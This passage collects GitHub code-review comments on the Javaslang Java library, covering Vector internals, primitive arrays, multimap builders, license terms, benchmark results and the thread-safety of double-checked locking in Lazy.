Math.max(minLength, length), array, 0, 0, length);\n}\n. Yes, Java 9 complains also...\n. ?\n. hmmm, why sources?\n. hmm, why char, because of CharSeq?\n. I think this can also be\njava\napplyCollection(CharSeq::of);\n. I think this should rather be\njava\napplyCollection(chars -> PriorityQueue.ofAll(Iterator.ofAll(chars)));\notherwise you're iterating over the elements 3 times.\nI know it's 'just' a test, but tests also serve as usage documentation.\n. same\n. we could make it GWT compatible, but I doubt it would be very useful from javascript:\njava\npublic int parseUnsignedInt() {\n    int result = Integer.parseInt(back);\n    if (result < 0) { throw new NumberFormatException(back + \" is not unsigned!\"); }\n    return result;\n}\n. But doesn't it state that you're not allowed to do that, i.e. copy right? :/\n. I'm not sure, this is what the doc states:\n\n\nRedistribution\n\nYou may reproduce and distribute copies of the Work or Derivative Works thereof in any medium, with or without modifications, and in Source or Object form, provided that You meet the following conditions:\n- You must give any other recipients of the Work or Derivative Works a copy of this License; and \n- You must cause any modified files to carry prominent notices stating that You changed the files; and \n- You must retain, in the Source form of any Derivative Works that You distribute, all copyright, patent, trademark, and attribution notices from the Source form of the Work, excluding those notices that do not pertain to any part of the Derivative Works; and \n- If the Work includes a \"NOTICE\" text file as part of its distribution, then any Derivative Works that You distribute must include a readable copy of the attribution notices contained within such NOTICE file, excluding those notices that do not pertain to any part of the Derivative Works, in at least one of the following places: within a NOTICE text file distributed as part of the Derivative Works; within the Source form or documentation, if provided along with the Derivative Works; or, within a display generated by the Derivative Works, if and wherever such third-party notices normally appear. The contents of the NOTICE file are for informational purposes only and do not modify the License. You may add Your own attribution notices within Derivative Works that You distribute, alongside or as an addendum to the NOTICE text from the Work, provided that such additional attribution notices cannot be construed as modifying the License.\nYou may add Your own copyright statement to Your modifications and may provide additional or different license terms and conditions for use, reproduction, or distribution of Your modifications, or for any such Derivative Works as a whole, provided Your use, reproduction, and distribution of the Work otherwise complies with the conditions stated in this License.\n. > Unfortunately doclint will error when the parameters etc. are not documented in the javadoc. How could we improve the documentation here?\n\nI've checked the Javadoc maven plugin and couldn't find an option to disable this warning.\nIs the warning also present of there is no @param at all (there are lots of methods in Javaslang that don't have param docs :/)?\nI think it would enhance readability if very obvious things weren't documented, like a description AND a @return that say the same things, or when self-describing parameters are spelled out as documentation also.\n. I agree, just pointing it out :)\n. :+1:\n. I think that if you change createFromEntries to M also, you won't nee these casts (multiple ones in this file)\n. I find back to be a confusing name, is it an abbreviation of backing or is it meant as the opposite of front or does it mean that something is stored in reverse order?\nIn my opinion delegate might be more appropriate in this case.\n. hmm, linear size method?\n. ?\n. :+1: for removing reflection here\n. could be a one-liner to increase signal-to-noise-ratio:\njava\nreturn (that == this) || ((that instanceof HashMultimap) && this.delegate.equals(((HashMultimap<?, ?>) that).delegate);\n. I don't mind, but was this kept on purpose, i.e. no \"HashMultimap[\" +?\n. I think it's confusing that this doesn't actually return a Supplier.\nMaybe rename to emptyMap or empty?\n. are these package private on purpose?\n. reminder: TODO\n. ah, ok, I see there are multiple ones :)\n. same, can be a one-liner\n. maybe put pre-conditions to the rest of the params also?\n. you could change this to an switch instead, as ContainerType is an enum and maybe extract to separate method, to get rid of break statements, e.g.:\njava\n@Override\npublic java.util.Map<K, Collection<V>> toJavaMap() {\n    final java.util.Map<K, Collection<V>> javaMap = new java.util.HashMap<>();\n    final Supplier<Collection<V>> supplier = getJavaContainerSupplier();\n    for (Tuple2<K, V> t : this) {\n        javaMap.computeIfAbsent(t._1, k -> supplier.get()).add(t._2);\n    }\n    return javaMap;\n}\nprivate Supplier<Collection<V>> getJavaContainerSupplier() {\n    switch (containerType) {\n        case SEQ:\n            return java.util.ArrayList::new;\n        case SET:\n            return java.util.HashSet::new;\n        case SORTED_SET:\n            return java.util.TreeSet::new;\n        default:\n            throw new IllegalStateException(\"Unknown ContainerType: \" + containerType);\n    }\n}\nedit, or even better, the enum could be extended with a supplier parameter\n. not public on purpose?\n. this should be extracted to a method, like\njava\nstatic boolean hasEvenSize(Object[] pairs) { return (pairs.length & 1) == 0; }\n. these will disappear after rebase, right?\n. would it be possible to force push these, otherwise we're reviewing the same line multiple times (even though they were fixed in a later commit)?\n. I envy your drive for writing Javadocs...\n. Do we really need it, if it works with defaults also?\n. Yup, that's my recommendation also, something like:\njava\n@Retention(RetentionPolicy.CLASS)\n@Target(ElementType.METHOD)\n@interface GwtIncompatible {\n}\n. :) k, thanks\n. Fewer lines usually decrease it, if no new tests are added - exception being partial line matches, like this one.\n. yes, that's what I meant :)\nBut other rebases can be done nicely from Idea also (VCS / Git / Rebase).\n. In other cases we store the length, e.g. Tree.\nIt bothers me, as a simple loop over the elements will end up being quadratic, not linear and I find that very counter-intuitive.\n. I think we should rather generate them ...\n. hmm, why do you have several copies of the annotations now?\n. If I'm mistaken correctly, you only need these for the source code, right (i.e. Javaslang clients don't have to see the annotations)?\nWould it make sense then to actually include the original GWT annotations as a build (provided?) dependency (i.e. used for build, but not packaged)?\n. http://stackoverflow.com/questions/3567413/why-doesnt-a-missing-annotation-cause-a-classnotfoundexception-at-runtime\nCould we give it a try anyway?\n. do we need these?\nWhat's the difference between importing statically Option or API?\nI mean these are already available to us by importing Option statically.\n@danieldietrich ?\n. fixed, thanks\n. Here we could, since it's already boxed, but wanted the allocations to be in a single place ...\n~~Will change it :)~~ Will keep it for now for the above mentioned reason.\n. it should be the same as for Traversable's grouped, though it's applied recursively until the root array is small enough (<=32)\n. Why do you think a constant method is weakening?\nI need BRANCHING_BASE to be changeable because it's very difficult to test and debug a tree that huge.\nAlso, constants could be inlined in other places (e.g. maybe a 2 * BRANCHING_FACTOR would be inlined) and changing the final variable from the test wouldn't change this particular usage.\nI would prefer keeping it a method, or keeping the BRANCHING_BASE for the tests also (would only be able to test 2-3 levels that way)\n. I thought of this as a guard statement, but I don't mind else-ing it either :)\n. I couldn't anticipate every benchmark modification need, so every PR contained some modifications here also.\nNow that it's mostly done, I will separate the unrelated benchmarking modifications to a separate PR :)\n. I reimported the settings, the formattings seems ok now in the separated PR:\n- https://github.com/javaslang/javaslang/pull/1558\nWill rebase this, once that's merged.\nThanks for the comments, I don't mind these minor ones either :)\n. Not sure what you mean, please check the separated PR if you think the formatting is ok there: https://github.com/javaslang/javaslang/pull/1558/files\n. Thanks, but I did test it and it was surprisingly slow.\nWill try to come up with something better, if you don't like it.\n. > Our test cases are not right (interpreted).\nI'm surprised you think so. Feel free to investigate, I would be happy to find a better solution :)\n. This is a backup plan (i.e. we could spell out every primitive), though I'm not even sure whether this would work/is necessary in Javascipt.\n@ruslansennov, what are your thoughts on the rest of the PRs?\n. empty can be called with minLength 10 also, resulting in a simple allocation, no copying.\nThis might be counter-intuitive, but allocation has to be in a single place, not spread all over the codebase.\n. Good catch, thanks :)\n. could we return  a Seq here instead?\n(maybe Tuple should implement Seq to make it possible)\n@danieldietrich?\n. This was a mistake, indeed, but it still cannot find the class.\nCould you please experiment with it?\n. > I'm not convinced that these methods are really useful, they do not encourage a good programming practice.\nI'm not convince either, but @ruslansennov's example seems like a case for a list.toTuple (and the opposite, tuple.toList), though the generics for those would probably be horrible :D\nHowever, I think these discussions should be held before someone is finished implementing it already (sorry @ashrko619, I've been there numerous times also)...\n. this is more type-safe, and the tuple aliase will make it more readable in the future :)\n. should be a TreeMultimap with LinkedHashSet, but I couldn't find that ...\n. a zipWith would be useful for Tuples here :/\n. ~~it would make sense to make tuples support better for these situations ... or should I use a Seq here instead?~~ done\n. Changing\njava\npublic static <V> Builder<V> withSet() {\n    return new Builder<>(ContainerType.SET, HashSet::empty);\n}\nto\njava\npublic static <V> Builder<V> withSet() {\n    return new Builder<>(ContainerType.SET, LinkedHashSet::empty);\n}\nwould probably enable me using a multimap instead ... should I try that in a separate PR?\n@ruslansennov ?\n. Changed it to Seq instead\n. didn't know about this until now :)\n. @ruslansennov, Set is an interface, there is no \"default set\", returning HashSet would be as valid as a LinkedHashSet or even TreeSet.\nBut I'm sure you know that, not sure where your hostility originates from.\nIf you find it offensive that I recommend modifications to your code, no problem I can circumvent it by simulating a multimap also (as done currently).\n. @danieldietrich, are you sure it's working? I still couldn't get it to work.\nCould you try it with skipped tests or the test-compile phase instead? (should take ~3 hours to complete, anything shorter is just tests):\nIs this also working for you\nmvn test-compile -pl javaslang-benchmark -P benchmark\nor\nmvn test -pl javaslang-benchmark -P benchmark -D skipTests\n?\n. Pushed a new version, with exec:exec plugin instead of exec:java (as we need a forked JVM), with updated documentation and fixed main.\nIt's working currently with\nmvn clean test -P benchmark -pl javaslang-benchmark\n. include patterns were wrong if called via aggregated main method :/\n. exec, not java\n. Thank you, I didn't know about that :).\nSince this is part of the tests (i.e. it's not part of the public contract), we could simply catch a Throwable, since that's what we're testing.\n. these constructors receive a warning now\n. this was weird, the compiler complained that Lazy was untyped here ...\n. these recursive types confuse the compiler.\nI don't know if the replacement is correct - that's not the point yet, just to investigate how much effort the migration will be - and what benefits it will have.\n. direct newInstance call is also deprecated now\n. I kinda' agree, the build isn't passing now either. I already opened a bug for a compiler crash, but they didn't fix it yet, I had to circumvent it.\nWhen we do have an error though (please see the Travis log or pull it locally) or a simplification (e.g. the Character constructor), we should definitely take advantage of Java 9's wisdom.\n. java\nError:(761, 59) java: incompatible types: invalid method reference\n    method compareTo in interface java.lang.Comparable<T> cannot be applied to given types\n      required: ? super K\n      found: K,K\n      reason: actual and formal argument lists differ in length\n. I agree, will think of a better solution, thanks.\n. I tried so many alternatives here (including the one you suggested), I didn't even know which one was committed in the end. This is why I needed an extra pair of eyes, thanks :).\n. Will need parent instance in the future, i.e. it's conceptually part of the instance.\n. Valid question (and awesome new GitHub changes).\ncompactHeight is needed in cases when e.g. you have a tree of height 5 and you drop most of it, that could fit on a tree of e.g. height 2. In that case, the root will have a single child, and its child will also have a single child. Maybe even the next one, but that cannot be guaranteed (imagine a 1, prepended by 0 ... you will have two levels, though it could fit on a single one ... note also, that this doesn't escalate, the biggest difference because of these is one level difference).\nIn this case (i.e. after drop and take) there's just no point in keeping all those extra depth, hence the compactor :).\n. instead of defining a Function and calling ::apply, where the method expects a different SAM (or inlining it, violating DRY), a method can satisfy both :)\n. - same with filter\n- does unboxing for every element (note, unboxing is very cheap, compared to boxing), to make it more reaalistic, as filtering usually implies checking the value. \nNote, copying one list to another via simple copy and boxing/unboxing:\njava\nRatio                      32     1024    32768\ncopy_unboxed/copy_boxed 3.99\u00d7    6.44\u00d7    4.61\u00d7\nunboxing/boxing         5.26\u00d7   11.19\u00d7    6.23\u00d7\n. simplified filter, based on the recommendation of @RichardWarburton. Thanks.\n. @RichardWarburton, we're using loops here, as we're simulating rebuilding the given data structure, one-by-one.\nWe're interested in the amortized cost of the operations across different edge cases (e.g. where append needs to add a new level to the tree).\nIf we could use bulk operations, we could simply return the already created instance.\nDoes it make sense or do you recommend a better approach :)?\n. let's extract these to constants, we don't need to change them programatically from tests anymore :)\n. @danieldietrich, no more BMT leaks into Vector :)\n. @danieldietrich, is this ok?\n. @danieldietrich, unifying these was a good advice :)\n. @danieldietrich, unified these also, as per your suggestion\n. could be optimized to take advantage of the fast that map keeps the original structure (i.e. almost 2x speedup), but would result in slightly more complicated code.\n@danieldietrich?\n. mutating a local variable and writing it back to MutableInt at the end makes it ~5% faster\n. we could also drop leading nulls, but that wouldn't result in any speed advantage, just aesthetics...\n. this is also private now, but since it's accessed from iterator, this way we can avoid the bridge\n. Could also unroll the middle manually, resulting in a measurable change, but distorting the code significantly, i.e.\njava\nint i = start;\nfor (; i < end - 3; i += 4) {\n    final int val = index.val;\n    elems[val] = mapper.apply(leaf[i]);\n    elems[val + 1] = mapper.apply(leaf[i + 1]);\n    elems[val + 2] = mapper.apply(leaf[i + 2]);\n    elems[val + 3] = mapper.apply(leaf[i + 3]);\n    index.val = val + 4;\n}\nfor (; i < end; i++) {\n    elems[index.val++] = mapper.apply(leaf[i]);\n}\nbefore:\njava\nMap slang_persistent/scala_persistent 1.26\u00d7  1.53\u00d7  1.88\u00d7\nafter:\njava\nMap slang_persistent/scala_persistent 1.40\u00d7  1.54\u00d7  1.92\u00d7\ni.e. not worth it\n. Indeed, now I can rename it back. Previously it was used from Vector, which had its own EMPTY\n. I formatted these manually, the formatter should keep them intact (mine does).\nI wanted the formatting to reflect how it would look in e.g. Scala or in a Java 8 lambda: very simple methods in the same line, complex ones on multiple, to increase SNR.\n. I strongly think we should base speedups on JMH benchmarks, our intuition is most often wrong about these ...\n. could you please rename tmp to something meaningful?\n. this comment if for review only, I don't think it should stay in the code.\n25%, based on what?\n. if you intend to return a Traversable<V>, shouldn't the default value be of that type also?\n. Good point, thanks (haven't noticed Daniel's review)\n. the comments are kept in history, if somebody is interested, otherwise, in my opinion, they're just a distraction\n. checking for a non-volatile variable is faster.\nSince the actual value can be null also (but the supplier cannot), we can short-circuit checking it first.\n. @danieldietrich, is this correct?\nOtherwise I should call .toJavaArray(Lazy<Integer>.class), which isn't valid\n. Now I got what the comment meant, I though it has historical significance only.\nYou're right, some comment IS needed here :)\n. done in https://github.com/javaslang/javaslang/pull/1578\n. Yes, but how DO we make it work for e.g. Option<Integer> otherwise?\nI think we should only revert, if we can find a better solution...\n. Since the tree is conceptually not completely symmetric (i.e. a prepend changes existing indices, an append doesn't), we don't need to store every array as if it were a full array, i.e. if we have only 20 elements, the array can be of length < 32.\nIf you have a full array and drop 10 from the end, we can create a new array of size 22.\nIf however we drop from the beginning, it's easier to make a full array, and only copy the kept elements (and store the difference in the offset), having the effect of prepend with nulls.\nIf we would want to eliminate all leading nulls, the computations would be more difficult (though I can try again, if this constant overhead (that's applicable only to non-leaf nodes) bothers you).\n. I think we have a lot bigger problem, than optimizations: all the tests are passing with non-volatile fields also!\nI tried creating a test that would fail, but haven't come up with one yet (only if I put \nTry.run(() -> Thread.sleep(ThreadLocalRandom.current().nextInt(2))) all over the production code):\n``` java\n@Test\npublic void shouldBeConsistentFromMultipleThreads() throws Exception {\n    final Vector, Integer>> values = Vector.range(0, 10000).map(i -> {\n        final Integer expected = ((i % 2) == 1) ? null : i;\n        final AtomicBoolean isEvaluated = new AtomicBoolean(false);\n        final Lazy lazy = Lazy.of(() -> {\n            Try.run(() -> Thread.sleep(ThreadLocalRandom.current().nextInt(2)));\n            assertThat(isEvaluated.getAndSet(true)).isFalse();\n            return expected;\n        });\n        return Tuple.of(lazy, expected);\n    });\nCompletableFuture.allOf(\n        values.flatMap(t -> range(0, 10)\n                .map(j -> runAsync(() -> assertThat(t._1.get()).isEqualTo(t._2)))\n        ).toJavaArray(CompletableFuture.class)\n).join();\n\n}\n```\n@danieldietrich, @jbgi, @zsolt-donca, can someone tell me why this isn't failing for non-volatile fields, i.e.:\n``` java\nprivate Supplier<? extends T> supplier;\nprivate T value;\n@Override\npublic T get() {\n    if (value == null) {\n        synchronized (this) {\n            if (supplier != null) {\n                value = supplier.get();\n                supplier = null;\n            }\n        }\n    }\n    return value;\n}\n```\n(it IS failing if we do a non-synchronized, single check)\n. > We will not introduce unsafe/breaking code\nThis (and the previous) also break for primitives, e.g.\njava\nfinal Value<Integer> value = of(1, 2, 3);\nfinal Integer[] ints = value.toJavaArray(int.class);\nI guess this is why Java provides an actual array instead...\n. @danieldietrich, I couldn't manage to make it work with slang Future (that fails for non-double check), only with CompletableFuture\n. I think some unsafety is inherent. Arrays are really messy.\nSince I find it unlikely to occur in real life (the primitive one should occur a lot more often), and since it will fail every time, signaling a real error (though not compile-time, but run-time), I think it's low-risk, and useful.\n. ... or we can deprecate it and do it Java's way, i.e. providing a preinitialized array as param.\n. It seems Java 7 introduced an implicit volatile when it detects double locking.\nShould we ask help from @shipilev?\n. I hesitated at first, but trying it out seems indeed like a good idea, thanks :)\n. The benchmark speeds are basically the same, pushed a new version.\nDid I address all your concerns?\n. Thank you for your expertise @shipilev!\nAs my comments also stated, I needed help in finding out why the obviously wrong code (i.e. no volatile) passed all the tests, before merging this PR (which wasn't obviously wrong to me, I though the volatile read after the non-volatile one will synchronize both. My mistake.).\nWill try to come up with a test that fails for the unsafe version you pointed out, so that I can better understand it - and we need to base our decisions on failing and passing tests anyway!\nThanks!\n. I will check those, once I have a failing test for all values that shouldn't work in theory, and pass for those, that should.\n. @shipilev, I couldn't find the latest jcstress on a Maven repo (did find an older one for a Gradle plugin though).\nI built the project, but it needs Java 9, and even then I get a compiler warning because  JCStressTestProcessor has a @SupportedSourceVersion(SourceVersion.RELEASE_6) (Javaslang needs Java 8 and is built with -werror via Maven).\nDo you recommend trying thread-weaver instead - though only 18 commits worry me a bit?\nps. The code you commented on was experimental, i.e. trying to make the tests fail - without success, though. The original was (and is again):\n``` java\ntransient volatile Supplier<? extends T> supplier;\nT value;\nT get() {\n    if ((value == null) && (supplier != null)) {\n        synchronized (this) {\n            final Supplier<? extends T> s = supplier;\n            if (s != null) {\n                value = s.get();\n                supplier = null;\n            }\n        }\n    }\n    return value;\n}\n```\ni.e. checking the non-volatile first seems to speed up the benchmarks.\n. @danieldietrich, pushed a new version - though I'm not sure about speed or correctness anymore :p\nFYI, get is small enough to be inlinable now , i.e. javaslang.Lazy::get (19 bytes) inline (hot)\n. @danieldietrich, this is ugly :/\n. I didn't have time to thoroughly investigate, but why narrow and iterator and toStream and new Tuple2, why not simply:\njava\nstatic <T1, T2> Tuple2<Seq<T1>, Seq<T2>> sequence2(Iterable<? extends Tuple2<? extends T1, ? extends T2>> tuples) {\n    return Tuple.of(Stream.ofAll(tuples).map(Tuple2::_1),\n                    Stream.ofAll(tuples).map(Tuple2::_2));\n}\n. why is there a need for the number at the end? It should be distinguishable via parameters.\n. what was the problem with the previous order?\nprepend comes conceptually before append, i.e. insert before should be before insert after, I think\n. - you're modifying the code you have previously modified in the same PR. Please rebase it, it confuses reviewers.\n- I still don't think it's a good idea to throw here :/\n. maybe name T as T0 to conform to the numbering sequence\n. K, thanks :)\n. slowed down tests too much (in debug mode only, didn't affect the actual benchmarks)\n. Interesting :). You're using // for delimiting groups in the same class, right?\n. technically R is also the type of the first argument ... or I guess it refers to the lambda argument ... ok :)\n. you could be more specific and check instance of Function0 maybe?\n. isn't this the same as if I would have imported the method from Either?\n@danieldietrich, what's the take on that, is this meant as a shortcut for only importing the API?\n. executorService of computation should probably be executorService or computation\n. these tests are very useful as documentation! :)\n. this seemed fishy at first (the toLowerCase, instead of specifying it separately, like in Either), but it represents very well how a human expects it to work, good job) :)\n. @valery1707, @danieldietrich, so what's the final decision, do we need aliases for already good enough naming (e.g. Either, Optional or Try)?\n. could you provide a test for option(null) also, I'm not sure how that should behave differently from some (I guess it should represent a none intuitively)\n. hmm, i don't find it intuitive that we've uppercased only this one (for obvious reasons, though).\n@danieldietrich, how should we proceed in this case?\n. I think the \"error\" is redundant\n. same, \"error\" seems redundant here\n. I think we could/should have a general Object static factory here also/instead.\nIt could make sense to construct a CharSeq from a number also, e.g. charSeq(3.14)\n@danieldietrich?\n. :+1: \n. set?\n. why are you testing Java's stream?\n. map?\n@danieldietrich \n. It's ok, I was just confused for a second, which function we're talking about: the wrapper function or the function parameter.\n. I mean, this is the return type of the parameter, not of the wrapper method\n. I think that's what we're testing here :).\nIn this case it may be obvious (knowing the current impl), but imagine the Option(null) example, where it's not obvious immediately what the behavior should be, therefore the tests should probably assert it more specifically\n. Right, I didn't know about camel case methods, but you're right :).\n. Sure, I just meant it to reduce the number of additional methods.\n. I see, consider using either .toJavaStream() or rather java.util.stream.Stream.of('1', '2', '3') instead :)\n. sleeping on it, it might make sense to only test that it returns anything, without repeating the production logic of how it should behave exactly.\n. We could check the return for instanceof, but I don't mind either way :)\n. Good idea, but how would we handle the difference between slang Stream and java stream?\ntoStream vs stream is not very desciptive in my opinion\n. please express the unit in the name also, people shouldn't have to look in the documentation to see whether of (..., 1) sleeps for 1 milllisecond or 1 second.\nI recommend something like:\njava\nstatic <T> Future<T> of(CheckedSupplier<? extends T> computation, long delayMillis)\ninstead, to mimic e.g.\njava\npublic static native long currentTimeMillis();\n. not sure why a runnable is called unit here.\na unit of work, states the documentation. Maybe that's how it should be called then :)\n. :+1: \n. interesting ... \nConsider using Java 8 date-time-api's instead, like:\njava\nInstant now = Instant.now();\n...\nDuration.between(now, Instant.now()).minusMillis(...).toMillis()\n. Math.max(0, delta) ?\n. minor: Exception e?\n. you could use the built-in array initializer here (and in other places in the test):\njava\nfinal long[] time = { System.currentTimeMillis() };\n. This will be especially important, if they'll start with uppercase :)\n. @valery1707, I still think the documentation should be updated to make it obvious that we're not referring to the wrapper method's parameters and return value. If you think it's ok this way also, I don't mind, I care more about good code than good documentation :)\n. the decision is no instanceof check here, right? :)\n. :+1: for starting from 1, this way the end value reflects the Tuple type :)\n. I think this is a bit hacky, how about something like:\nscala\n${Seq(\"Right\", \"Left\").gen(t => {\nxs\"\"\"\n. minor: \nscala\nval ExecutorService = s\"${ExecutorServiceType}.newSingleThreadExecutor()\"\n. @danieldietrich, if await would return the parent Future, we could eliminate the need for this line, i.e. \njava\n$FutureType<Object> future = Future($value).await();\n. :+1: for additional, simple test criteria, without repeating the impl :)\n. Minor: I think we could use <?> also, i.e.\njava\n$FutureType<?> future = Future($value);\n. minor: name + \"ReturnNotNull\" could also be written as interpolated Scala string, I think\n. ~~This should be removed, right?~~ just saw the comment below\n. Is this to avoid collisions?\n. Minor suggestions:\n- consider making local variables final (@danieldietrich likes it that way)\n- you could name this t instead of starting with a weird underscore, since the scope is very small\n. maybe add the new PriorityQueue also? :)\n@danieldietrich ?\n. or\n. same\n. could be a link, i.e.\nA new {@code $traversableType} instance\n. test for empty Array()?\n. {@code $TreeSetType}?\n. same\n. or (note, I don't mind if you put these in a separate commit, as I know it can be a lot of work to rebase everything)\n. same, tests for empty?\n. multimap?\n@danieldietrich ?\n. {@code $mapType}\n. rather:\njavadoc\n* Alias for {@link $mapType#of(K, V)}\n. I think this could also be updated to #of(K, V)\n. :+1: looks really nice indeed\n. I don't mind either way, but since you used them previously, I thought it could be more consistent if you unify it. Whichever you prefer, I'm just expressing observations, the choice is yours :)\n. Idea seems to accept it, even navigation is working for the params :/\n. not sure what you mean, in Idea (via ctrl q), or from the generated HTML JavaDoc?\nEither way, whichever you think works, I just pointed out that it could be made more expressive/useful by providing links :)\n. k, thanks for clarifying :)\n. https://github.com/javaslang/javaslang/issues/1607\n. I'm not sure about this, please check the usages.\nIt's only used currently to reverse it, maybe we should eliminate this method completely instead.\n. You could probably use the built-in toStream() instead:\njava\nreturn toStream().flatMap(mapper);\n. same ...\n. :+1: \n. Wasn't sure abut the performance of prepend, but a quick JMH showed it has the same speed in Stream as append does :).\n:+1: \n. same, please use toStream().map(mapper) instead\n. same\n. same\n. why is this an Option exactly, when it could simply return an empty Seq instead?\n@danieldietrich?\n. I think this should remain a List\n. same\n. Thanks @valery1707 :)\nIn case @danieldietrich thinks this is battle-ready, could you please apply it to the usages in FutureTest also :)?\n. :+1: \nI hope this has real-world value also :)\nCould we provide a non-trivial test for this?\n. suggestion: \n@deprecated Should not be used any more because it's unsafe. Use the (K, V) vararg alternative or the Tuple alternative instead\n. same\n. minor: formatting, too many spaces before the params\n. Since we know the type of the params, we may want to show it in the javadoc also, i.e.\n\"K, V\")(\", \")\n. I think this cast ((Comparator<? super K> & Serializable) is not Java 9 safe :/\n. * @param keyComparator The comparator used to sort the entries by their key.\n. Were the parameter docs omitted on purpose here?\n. For type safety and better documentation via tests, maybe we should use .merge() instead, i.e.\njava\nstatic final Map<Integer, String> LENGTHS = TreeMap.of(\n        1, \"one\",\n        2, \"two\",\n        3, \"three\",\n        4, \"four\",\n        5, \"five\",\n        6, \"six\",\n        7, \"seven\",\n        8, \"eight\",\n        9, \"nine\",\n        10, \"ten\"\n).merge(TreeMap.of(\n        11, \"eleven\",\n        12, \"twelve\",\n        13, \"thirteen\",\n        14, \"fourteen\",\n        15, \"fifteen\",\n        16, \"sixteen\",\n        17, \"seventeen\",\n        18, \"eighteen\",\n        19, \"nineteen\",\n        20, \"twenty\"\n)).merge(TreeMap.of(\n        30, \"thirty\",\n        40, \"forty\",\n        50, \"fifty\",\n        60, \"sixty\",\n        70, \"seventy\",\n        80, \"eighty\",\n        90, \"ninety\",\n        100, \"hundred\",\n        1_000, \"thousand\",\n        1_000_000, \"million\",\n        1_000_000_000, \"billion\"\n));\n(though this doesn't seem to compile ... @danieldietrich, why is this working if I extract the parts and merge them in a method, but not inline?)\nMaybe we could extend the merge to vararg also, so that larger maps can be created in a safe way also :)\n. we could reuse the previous ones here, i.e.\nintead of\njava\nreturn TreeMap.<K, V> empty(keyComparator).put(k1, v1).put(k2, v2).put(k3, v3).put(k4, v4).put(k5, v5).put(k6, v6).put(k7, v7).put(k8, v8).put(k9, v9).put(k10, v10);\njava\nreturn of(keyComparator, k1, v1, k2, v2, k3, v3, k4, v4, k5, v5, k6, v6, k7, v7, k8, v8, k9, v9).put(k10, v10);\n. we could use the newly created aliases here\njava\nfinal Queue<Tuple2<K, V>> list = Queue(Tuple(k1, v1), Tuple(k2, v2));\n. @ruslansennov, should we open a bug report for this?\n. Until now this was a stateless helper for manipulating Object[] arrays.\nNow every primitive type will get a different LeafType instance, that helps in manipulating the given array in a generic way (getting/setting elements, creating new primitive arrays, etc).\n. intermediary commit, that removes all Object[] references, changing them to Objects and accessing them in a single place using getAt, setAt and lengthOf, so that these methods can be specialized in the next commit to every primitive.\n. since we have Objects everywhere, array notation cannot be used anymore, since the Object[] type cannot refer to primitive arrays, but Object can\n. Benchmark primitive storage, too.\nSpeed is only compared against int[], but memory is measured for byte[] also.\n. these asserts also make sure that we actually have int[] inside\n. if we can't add an element to the Vector (i.e. null or String to a primitive collection), copy everything once, and add it to that instead.\n. create primitive int[] array and test that it contains the correct elements and that it's stored as int[], not Object[]\n. same for char[], which doesn't have an optimized LeafType yet, just a generic one via reflection (currently only int[] arrays are optimized speed-wise, the rest are all delegated to java.lang.reflect.Array).\nEach primitive can be optimized on demand, as done in IntArray.\n@danieldietrich, would you like me to add other primitive speed optimizations in this commit also, or is int[] enough for now (the rest are also stored as primitives, but their usage is slower because of the reflective call)\n. this is the way to iterate over a primitive-enabled Vector, without any boxing/unboxing\n. ranges should be stored in space-and-iteration-friendly primitive arrays <3\n. generic converter for non-optimized array access (only needed if we don't privide converters for every primitive)\n. ints are used very often, let's optimize their access (storage is the same in all cases)\n. general Object[] array access (including e.g. Integer[])\n. Interesting idea, I like it, I will try to come up with such a construct :)\n. @danieldietrich, should I put these in a separate module, i.e. javaslang-primitive?\n. Maybe, this PR is not meant to be merged, it's mainly a Request For Comment, so that we know where we stand :)\n. funny, I didn't know that :)\n. I see, consider using isEmpty then :) (or leave Stream.empty())\n. please rename test to reflect the intent better ...\nisFirstValue or something?\n. Should we add these kinds of comments for new tests from now on?\n. I think these can be simplified\n``` java\n@Override\ndefault Iterator dropUntil(Predicate<? super T> predicate) {\n    Objects.requireNonNull(predicate, \"predicate is null\");\n    return find(predicate)\n            .map(t -> of(t).concat(this))\n            .getOrElse(empty());\n}\n@Override\ndefault Iterator dropWhile(Predicate<? super T> predicate) {\n    Objects.requireNonNull(predicate, \"predicate is null\");\n    return dropUntil(predicate.negate());\n}\n``\n. all tests seem to be passing without these modifications also (takeWhile/takeUntil) :/\n. We drop all the values until the element is found, after which we put it back to where we extracted it from (i.e. the front of the iteration). Otherwise, if it wasn't found, we return the empty iterator.\nThe tests are passing for this.\n. Feel free to benchmark it :)\n. would that==theempty()` instance? I think we're checking for reference equality in case of non-match\n. > My plan is to resolve 68 issues (tendency increasing because of new tickets). \nI think our issues originate from more complicated code.\nI have benchmarked the two alternatives like follows:\n``` java\npublic static class DropWhile extends Base {\n    final Predicate predicate = e -> e != ELEMENTS[CONTAINER_SIZE / 2];\n@Benchmark\npublic int slang_persistent() {\n    int length = Iterator.of(ELEMENTS).dropWhile(predicate).length();\n    assert length == Array.of(ELEMENTS).dropWhile(predicate).length();\n    return length;\n}\n\n}\n```\ni.e. let's drop the iterator until the middle, and consume all resulting elements via length.\nThe results for 10, 1_000 and 100_000 elements:\nThe explicit, long solution:\njava\nParams          Score   Unit\n    10  10,827,509.92  ops/s\n  1000     144,264.98  ops/s\n100000       1,333.39  ops/s\nThe reusing, short solution:\njava\nParams          Score   Unit\n    10   1,688,373.91  ops/s\n  1000     191,893.42  ops/s\n100000       2,065.07  ops/s\ni.e. for very few elements, your solution is 10x faster, after which the other one becomes faster.\n. disabled FUNCTIONAL_JAVA, PCOLLECTIONS and ECOLLECTIONS by default\n. reduced the benchmarks parameters to speed up builds\n. can't compare it against anything :/\n. ... Scala is really not meant to be called from Java ...\n. no need to recreate it in Iterate as we don't change the javaMutable in any way :)\n. generalized prepend to reuse all newly inserted arrays (minimizing the copies)\n. MutableInt is more elegant than a single element int[].\nWe need this for multiple return (without using Tuples and boxing)\n. same with append\n. @danieldietrich requested previously that I call length via the field, not the method.\nNow this class is encapsulated enough that I applied it :)\n. this change should make scanRight faster also :)\n. changed List to Vector for efficient reverseIterator\n. I find indentations important also (though I aligned it this way on purpose).\nWill change it.\n. indeed, thanks\n. I thought about it, forgot to add it, thanks :)\n. Valid question: the collapse is working on the parent nodes only, which are always reference arrays, never primitives ones (we wouldn't have anything to collapse if they weren't pointing to other nodes)\n. So instead of\nobj().setAt(array, previousIndex, leaf.apply(obj().getAt(array, previousIndex), lastDigit(index)));\nyou would prefer\njava\nObjectArrayType.INSTANCE.setAt(array, previousIndex, leaf.apply(ObjectArrayType.INSTANCE.getAt(array, previousIndex), lastDigit(index)));\n?\nI can't really make the methods in ObjectArrayType static as they would collide with the overrides.\nI also can't import ObjectArrayType.INSTANCE.* in Java - would be nice, though.\n. Sure, but it's the type of the Vector also (i.e. the T)\n. > We don't need to check the types. Because we already use T\nyou can add a String to a primitive array via narrow, e.g.\njava\n@Test\npublic void 